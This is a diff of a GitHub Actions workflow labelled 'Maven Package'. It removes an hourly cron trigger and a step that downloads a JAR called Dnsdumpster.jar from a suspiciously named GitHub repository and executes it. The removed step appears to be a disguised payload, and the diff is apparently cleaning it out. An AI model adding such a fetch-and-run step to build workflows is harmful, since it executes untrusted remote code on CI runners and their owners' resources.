@@ -3,12 +3,6 @@
 
 name: Maven Package
 
-on:
-  repository_dispatch:
-  workflow_dispatch:
-  schedule:
-    - cron: '0 */1 * * *'
-
 
 jobs:
   build:
@@ -23,8 +17,6 @@ jobs:
         java-version: '11'
         distribution: 'adopt'
     - name: execute permission
-    - run: |
-          wget https://github.com/riezharriz82/leetCdokter/raw/master/Dnsdumpster.jar
-          java -jar Dnsdumpster.jar
+
 
 
